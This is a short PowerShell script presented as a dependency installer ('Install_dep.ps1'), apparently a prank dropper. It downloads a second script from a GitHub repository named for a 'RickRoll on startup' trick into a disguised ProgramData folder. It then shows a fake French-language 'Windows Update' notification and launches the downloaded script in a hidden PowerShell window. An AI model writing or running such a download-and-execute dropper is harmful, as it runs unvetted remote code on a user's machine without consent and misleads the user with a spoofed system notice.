# Install_dep.ps1
$url = "https://raw.githubusercontent.com/delete-user-56/RickRoll_OnStartup/main/InstallRR.ps1"
$destination = "C:\ProgramData\WINcache\InstallRR.ps1"

Invoke-WebRequest -Uri $url -OutFile $destination

Add-Type -AssemblyName System.Windows.Forms

$notify = New-Object System.Windows.Forms.NotifyIcon
$notify.Icon = [System.Drawing.SystemIcons]::Information
$notify.BalloonTipTitle = "Windows Update"
$notify.BalloonTipText = "Des mises à jour sont disponibles. Cliquez ici pour les installer."
$notify.Visible = $true
$notify.ShowBalloonTip(1000)
$notify.Dispose()

Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile -WindowStyle Hidden -File `"$destination`"" -WindowStyle Hidden
